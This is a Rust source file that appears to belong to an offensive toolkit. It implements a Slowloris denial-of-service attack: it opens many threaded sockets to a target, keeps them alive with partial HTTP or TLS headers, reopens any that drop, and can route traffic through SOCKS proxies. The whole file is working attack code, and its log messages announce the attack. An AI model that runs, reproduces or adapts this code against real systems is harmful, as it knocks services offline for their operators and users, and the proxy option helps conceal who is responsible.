use std::{
    net::ToSocketAddrs,
    process,
    sync::mpsc::{channel, Receiver},
};

use anyhow::{Context, Result};
use log::{debug, error, info};
use rustls::Stream;
use spinners::{Spinner, Spinners};
use tokio::runtime::Runtime;

use crate::actions::slowloris::{
    config::SlowlorisConfig,
    proxy::spawn_socks_clients_and_attack,
    socket::{init_socket, write_msg},
    tls::init_tls,
};
const THREADS: usize = 10;

pub fn do_loris(c: &seahorse::Context) {
    let runtime = Runtime::new().unwrap();
    runtime.block_on(async move {
        let conf = match SlowlorisConfig::new(c) {
            Ok(c) => c,
            Err(e) => {
                error!("{}", e);
                process::exit(1);
            }
        };
        let rx = ctrlc_handler();
        info!("Starting slowloris attack on {}", conf.url());
        info!("If you want to stop the attack, \x1b[31mpress Ctrl-C\x1b[m \x1b[36m\x1b[m");
        match execute(
            conf.url(),
            conf.socket_count(),
            rx,
            conf.http_only(),
            conf.proxies(),
        )
        .await
        {
            Ok(_) => info!("Attack finished"),
            Err(e) => error!("{}", e),
        };
    })
}

async fn execute(
    ip: &str,
    sock_cnt: usize,
    rx: std::sync::mpsc::Receiver<()>,
    http_only: bool,
    proxies: &[String],
) -> Result<()> {
    let mut sock_list = Vec::new();
    // If proxies are specified, use them
    if !proxies.is_empty() {
        return spawn_socks_clients_and_attack(
            proxies,
            &ip.to_socket_addrs()?.next().unwrap().to_string(),
            sock_cnt,
            http_only,
        );
    }

    info!(
        "Creating {} sockets...with {} threads. \x1b[36mIt takes some minutes.\x1b[0m",
        sock_cnt, THREADS
    );
    let mut handles = Vec::new();
    for _ in 0..THREADS {
        let ip = ip.to_string();
        let handle = std::thread::spawn(move || {
            let mut socks = Vec::new();
            for _ in 0..sock_cnt / THREADS {
                match init_socket(&ip) {
                    Ok(s) => socks.push(s),
                    Err(e) => debug!("{}", e),
                };
            }
            socks
        });
        handles.push(handle);
    }
    for handle in handles {
        let mut socks = handle.join().unwrap();
        sock_list.append(&mut socks);
        info!("{} sockets created", sock_list.len());
    }

    info!(
        "\x1b[33mOk. Готово.\x1b[0m Starting Attack with socket: {}",
        sock_list.len()
    );
    // create TLS client
    let mut tls_client = init_tls(&ip);

    let mut sp = Spinner::new(
        Spinners::BoxBounce2,
        "\x1b[31mAttacking... В действии...\x1b[m \x1b[36m\x1b[m".into(),
    );
    loop {
        // Check if the user wants to stop the attack
        if rx.try_recv().is_ok() {
            break;
        }
        debug!(
            "Sending keep-alive headers... socket count: {}",
            sock_list.len()
        );
        let mut i = 0;

        // Send keep-alive headers
        while i < sock_list.len() {
            // HTTP
            if http_only {
                match write_msg(&mut sock_list[i]) {
                    Ok(_) => {
                        i += 1;
                    }
                    _ => {
                        sock_list.remove(i);
                    }
                }
                continue;
            }

            // HTTPS
            let sock = sock_list
                .get_mut(i)
                .with_context(|| "failed to get socket")?;
            let mut stream = Stream::new(&mut tls_client, sock);
            match write_msg(&mut stream) {
                Ok(_) => {
                    i += 1;
                }
                _ => {
                    sock_list.remove(i);
                }
            }
        }
        // Add new sockets if the list is not full
        for i in sock_list.len()..sock_cnt {
            match init_socket(&ip) {
                Ok(sock) => {
                    sock_list.push(sock);
                }
                Err(e) => {
                    debug!("Socket {} failed: {}", i, e);
                }
            }
        }
    }
    // at last kawaii spinner is stopped.
    sp.stop();
    Ok(())
}

// return a Ctrl-C signal receiver
fn ctrlc_handler() -> Receiver<()> {
    let (tx, rx) = channel();
    if let Err(e) = ctrlc::set_handler(move || {
        tx.send(()).expect("Could not send signal on channel.");
        info!("\x1b[32mДо свидания:)\x1b[m \x1b[35m\x1b[m");
        process::exit(1);
    }) {
        error!("Error setting Ctrl-C handler: {}", e);
        process::exit(1);
    };
    rx
}
